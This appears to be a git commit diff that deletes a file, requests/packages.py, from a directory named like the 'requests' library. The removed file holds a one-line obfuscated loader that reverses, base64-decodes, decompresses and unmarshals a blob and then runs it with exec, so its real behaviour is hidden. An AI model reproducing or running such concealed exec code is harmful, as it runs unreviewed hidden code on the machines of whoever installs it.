db873292b1ff38c276606d561dc969052cfe1cbf
JSON-XD <shajon2008x1@gmail.com>
2024-10-05 00:27:06 +0600

    Delete requests directory

--- requests/packages.py
+++
@@ -1,6 +0,0 @@
-# Encrypted by: SHAJON-404
-# FaceBook : https://www.facebook.com/mdshahomagdum.shajon
-# Github: https://github.com/SHAJON-404
-#==============================================#
-
-_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==AIq81wB8fnImvqFsYD5DziW3ytjSYekZLWi6rsc7Sf//ScCbudtwjtf1d6txj3YbV33hJ0dI4YoFkf+W6nb/iwgHznCK2HWqHv7KbVTdnyFpbzVemmJFuXqXvPwy9cm5WrnpJVqfPWYNq4SlczxY5EXddrB8HX5k0yRSe+tkXxsylXRJP7DFm8iwimhz7l1rlLxaZXPUcCvHeNHAmOGJkRYiVTF4wS+OprlRmLlExO1yDDSndksRwMyPUCoNesk4htkcgskcSLCae1uY6NIOLG1EIvF80NcVfrPSYgVZmqBXnyKo/m2397ioG1CYWW2zNK3jAtGtaDnhW4XEjDI1jxxs0EfYokdUK0JA3R3i3EeghudcvMWbQOoBUzuMfr5+8JyB0o7br1BPC6iF3x4jgd2YYOaz/MqrKm1xi7RXKBaDz4uBIOnq6qZCeJjghbP8wTf/d++4jP+gUMxNspknTBWriU/N7f7BSjJp8SSiMhf1kiIAR7UjudAmPA3ukQLO7hQJ4vbCaPMAz2OGrUtyJe'))
